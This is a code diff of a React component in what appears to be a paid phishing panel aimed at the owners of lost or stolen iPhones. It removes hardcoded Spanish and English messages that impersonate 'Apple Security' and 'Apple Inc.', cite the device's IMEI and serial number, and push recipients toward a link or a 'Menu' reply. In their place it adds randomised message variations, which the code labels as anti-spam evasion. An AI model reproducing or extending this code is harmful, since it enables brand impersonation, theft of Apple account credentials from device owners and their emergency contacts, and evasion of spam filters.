@@ -6,6 +6,7 @@ import { toast } from '@/hooks/use-toast';
 import { Trash2, Send, RefreshCw, Edit, Image, ImageOff } from 'lucide-react';
 import { supabase } from '@/integrations/supabase/client';
 import { getIphoneImageUrl } from '@/utils/iphoneImages';
+import { generateRandomMessage } from '@/utils/messageVariations';
 import EditProcessDialog from './EditProcessDialog';
 
 interface Process {
@@ -254,112 +255,8 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
 
       const { battery, delayedTime, formatDate, formatTime } = generateDynamicValues();
 
-      let message = '';
-      
-      if (language === 'spanish') {
-        if (process.contact_type === 'propietario') {
-          // Mensaje para propietario - VERSION OPTIMIZADA
-          message = `🔐 Notificación de Seguridad de Apple
-
-🔍 Tu iPhone fue detectado el **${formatDate(delayedTime, 'spanish')} a las ${formatTime(delayedTime)}** tras haberse conectado a internet.
-💡 Esto indica que el dispositivo **está activo y ha sido localizado con éxito**.
-
-📌 Mensaje automático enviado como **aviso prioritario al número registrado**.
-
-👤 Propietario: ${process.owner_name || 'No especificado'}
-📱 Modelo: ${process.iphone_model}
-🎨 Color: ${process.color}
-💾 Almacenamiento: ${process.storage}
-📟 IMEI: ${process.imei}
-🔑 Número de serie: ${process.serial_number}
-🔋 Batería: ${battery}%
-
-${process.url ? `🌍 Ver estado del dispositivo: ${process.url}` : ''}
-
-📬 ¿Eres el dueño? 👉 *Responde con* **Menú** para recibir ayuda inmediata del equipo de soporte técnico 👨🏽‍🔧
-
-🛡️ Apple Security – Servicio activo 24/7
-©️ 2025 Apple Inc.`;
-        } else {
-          // Mensaje para contacto de emergencia - VERSION OPTIMIZADA
-          message = `🔐 Notificación de Seguridad de Apple
-
-📱 El iPhone de **${process.owner_name || 'usuario registrado'}** ha sido detectado el **${formatDate(delayedTime, 'spanish')} a las ${formatTime(delayedTime)}**.
-
-⚠️ **Mensaje automático enviado a contactos de emergencia registrados**
-
-🔍 **Estado del dispositivo:**
-📱 Modelo: ${process.iphone_model}
-🎨 Color: ${process.color}
-💾 Almacenamiento: ${process.storage}
-📟 IMEI: ${process.imei}
-🔑 Serie: ${process.serial_number}
-🔋 Batería: ${battery}%
-
-${process.url ? `🌍 Ver ubicación en tiempo real: ${process.url}` : ''}
-
-👨‍👩‍👧‍👦 **Eres un contacto de emergencia de ${process.owner_name || 'este dispositivo'}**
-
-📝 **IMPORTANTE**: Por favor, informa al propietario que su equipo ya fue localizado.
-
-📬 Para asistencia inmediata 👉 *Responde* **Menú**
-
-🛡️ Apple Security – Sistema de emergencia
-©️ 2025 Apple Inc.`;
-        }
-      } else {
-        // Mensajes en inglés - VERSION OPTIMIZADA
-        if (process.contact_type === 'propietario') {
-          // Owner message in English - OPTIMIZED VERSION
-          message = `🔐 Apple Security Notification
-
-🔍 Your iPhone was detected on **${formatDate(delayedTime, 'english')} at ${formatTime(delayedTime)}** after connecting to the internet.
-💡 This indicates that the device **is active and has been successfully located**.
-
-📌 Automatic message sent as a **priority notice to the registered number**.
-
-👤 Owner: ${process.owner_name || 'Not specified'}
-📱 Model: ${process.iphone_model}
-🎨 Color: ${process.color}
-💾 Storage: ${process.storage}
-📟 IMEI: ${process.imei}
-🔑 Serial number: ${process.serial_number}
-🔋 Battery: ${battery}%
-
-${process.url ? `🌍 View device status: ${process.url}` : ''}
-
-📬 Are you the owner? 👉 *Reply with* **Menu** to receive immediate help from technical support team 👨🏽‍🔧
-
-🛡️ Apple Security – 24/7 active service
-©️ 2025 Apple Inc.`;
-        } else {
-          // Emergency contact message in English - OPTIMIZED VERSION
-          message = `🔐 Apple Security Notification
-
-📱 The iPhone belonging to **${process.owner_name || 'registered user'}** was detected on **${formatDate(delayedTime, 'english')} at ${formatTime(delayedTime)}**.
-
-⚠️ **Automatic message sent to registered emergency contacts**
-
-🔍 **Device status:**
-📱 Model: ${process.iphone_model}
-🎨 Color: ${process.color}
-💾 Storage: ${process.storage}
-📟 IMEI: ${process.imei}
-🔑 Serial: ${process.serial_number}
-🔋 Battery: ${battery}%
-
-${process.url ? `🌍 View real-time location: ${process.url}` : ''}
-
-👨‍👩‍👧‍👦 **You are an emergency contact for ${process.owner_name || 'this device'}**
-
-📝 **IMPORTANT**: Please inform the owner that their device has been located.
-
-📬 For immediate assistance 👉 *Reply* **Menu**
-
-🛡️ Apple Security – Emergency system
-©️ 2025 Apple Inc.`;
-        }
-      }
+      // Usar el generador de mensajes aleatorios
+      const message = generateRandomMessage(process, language, battery, delayedTime, formatDate, formatTime);
 
       let result;
 
@@ -450,7 +347,7 @@ ${process.url ? `🌍 View real-time location: ${process.url}` : ''}
         
         toast({
           title: "Mensaje enviado",
-          description: `Mensaje ${messageType} enviado en ${languageText} a ${process.client_name} (${contactTypeText}). Batería: ${battery}%. Créditos restantes: ${userCredits - 1}`,
+          description: `Mensaje ${messageType} enviado en ${languageText} a ${process.client_name} (${contactTypeText}). Batería: ${battery}%. Créditos restantes: ${userCredits - 1}. Variación anti-spam aplicada.`,
         });
 
         await loadProcesses();
